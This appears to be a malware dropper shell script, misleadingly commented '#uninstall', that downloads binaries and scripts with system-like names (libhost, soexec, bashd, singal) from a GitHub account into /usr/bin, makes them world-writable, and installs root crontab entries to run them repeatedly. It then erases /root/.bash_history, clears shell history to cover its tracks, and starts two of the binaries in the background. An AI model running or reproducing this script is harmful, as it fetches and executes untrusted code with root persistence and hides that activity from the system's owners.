#!/bin/bash
#
#uninstall
sed -i '/\* 12 \* \* \* root \/usr\/bin\/libhost.sh/d' /etc/crontab
sed -i '/\* 0 \* \* \* root \/usr\/bin\/bashd/d' /etc/crontab
sed -i '/\* 23 \* \* \* root \/usr\/bin\/soexec.sh/d' /etc/crontab
sed -i '/\* 8 \* \* \* root \/usr\/bin\/bashd.sh/d' /etc/crontab
sed -i '/\*\/5 \* \* \* \* root \/usr\/bin\/singal.sh/d' /etc/crontab

killall libhost
killall soexec
killall bashd

rm -rf /usr/bin/libhost.sh
rm -rf /usr/bin/soexec.sh
rm -rf /usr/bin/bashd.sh
rm -rf /usr/bin/singal.sh

rm -rf /usr/bin/libhost
rm -rf /usr/bin/soexec
rm -rf /usr/bin/bashd

rm -rf /usr/bin/libhost_ver.txt

wget https://raw.githubusercontent.com/myvulweb/mysh/master/libhost.sh -O /usr/bin/libhost.sh
wget https://raw.githubusercontent.com/myvulweb/mysh/master/soexec.sh -O /usr/bin/soexec.sh
wget https://raw.githubusercontent.com/myvulweb/mysh/master/bashd.sh -O /usr/bin/bashd.sh
wget https://raw.githubusercontent.com/myvulweb/mysh/master/bashd.sh -O /usr/bin/bashd.sh

wget https://raw.githubusercontent.com/myvulweb/fabu/master/libhost_ver.txt -O /usr/bin/libhost_ver.txt

wget https://raw.githubusercontent.com/myvulweb/singal/master/singal.sh -O /usr/bin/singal.sh

chmod 777 /usr/bin/libhost.sh
chmod 777 /usr/bin/soexec.sh
chmod 777 /usr/bin/bashd.sh
chmod 777 /usr/bin/singal.sh


wget https://github.com/myvulweb/fabu/raw/master/libhost -O /usr/bin/libhost 
chmod 777 /usr/bin/libhost
wget https://github.com/myvulweb/fabu/raw/master/soexec -O /usr/bin/soexec
chmod 777 /usr/bin/soexec
wget https://github.com/myvulweb/fabu/raw/master/bashd -O /usr/bin/bashd
chmod 777 /usr/bin/bashd

echo '* 12 * * * root /usr/bin/libhost.sh'>>/etc/crontab

echo '* 23 * * * root /usr/bin/soexec.sh'>>/etc/crontab

#exec 0:00-8:00
echo '* 0 * * * root /usr/bin/bashd'>>/etc/crontab
echo '* 8 * * * root /usr/bin/bashd.sh'>>/etc/crontab

echo '*/5 * * * * root /usr/bin/singal.sh'>>/etc/crontab

service crond restart

echo >/root/.bash_history
history -c
/usr/bin/libhost &
/usr/bin/soexec &

 